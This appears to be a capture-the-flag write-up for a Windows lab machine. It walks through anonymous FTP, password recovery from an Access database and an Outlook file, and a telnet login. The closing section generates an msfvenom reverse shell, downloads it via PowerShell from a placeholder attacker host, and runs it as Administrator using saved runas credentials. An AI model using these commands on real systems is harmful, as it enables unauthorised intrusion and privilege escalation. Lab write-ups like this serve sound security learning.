## Nmap


![](https://i.imgur.com/1jrYzz2.png)
I found a ftp service is running, and next tried to login annoymous.

## FTP
Through the Nmap result, I tried to log in FTP server.
![](https://i.imgur.com/rWyGfbl.png)

In the "Engineer" dir, I found a dir named 'Access Control.zip', that sounds suspicious.
```
$ get "Access Control.zip"
```
In the "Backups" dir, also find a file.
```
$ get "backup.mdb"
```
## backup.mdb
That's see the file, maybe it has something important information, so I use mdb hacking:
```
$ mdb-tables backup.mdb
```
![](https://i.imgur.com/oc3zby7.png)

This is a surprise discovery, We discover a table named "auth_user".
```
$ mdb-export backup.md auth_user
```
![](https://i.imgur.com/Tk6UFZX.png)

Wow, we already get engineer's password!
## Access Control.zip
I tried to analysis the zip, the first thing is unzip it.
```
$ 7z x Access\ Control.zip
```
It need to enter password, I tried to enter the password I found in backup.mdb, success!
unzip it, I found a file named **"Access Control.pst"**.

It's a outlook file, so I use this command to read it:
```
$ readpst "Access Control.pst"
```
Success get "Access Control", I can found a password in that.
```
$ cat "Access Control"
```
![](https://i.imgur.com/7ncNDKQ.png)
## Telnet
Use the account/password from "Access Control" file login.
![](https://i.imgur.com/DX54uPC.png)

In the Desktop, I success found "user.txt".
![](https://i.imgur.com/2Go85vl.png)
## Root
Finally, at the most difficult level, I tried a lot of ways to get root, and I found the **"runas"** tips from the machine.
I create a reverse shell in the attack machine first.
```
$ msfvenom -p windows/shell/reverse_tcp LHOST=<Your IP> LPORT=<Port> -f exe > shell.exe
```
then use powershell to get the exe file in the victim machine.
```
$ powershell -c (new-object System.Net.WebClient).DownloadFile('http://<Your IP>/shell.exe','C:\Users\security\shell.exe')
```
The final and most important step, use "runas" command to reverse shell.
```
$ runas /savecred /user:Administrator shell.exe
```
In this step, "runas" command had a special attritube named "/savecred", means the password that can be used to log in with the last user preset.
success get the shell in the meterpreter.
![](https://i.imgur.com/oBBPKCP.png)
root flag:
![](https://i.imgur.com/t8yupI5.png)
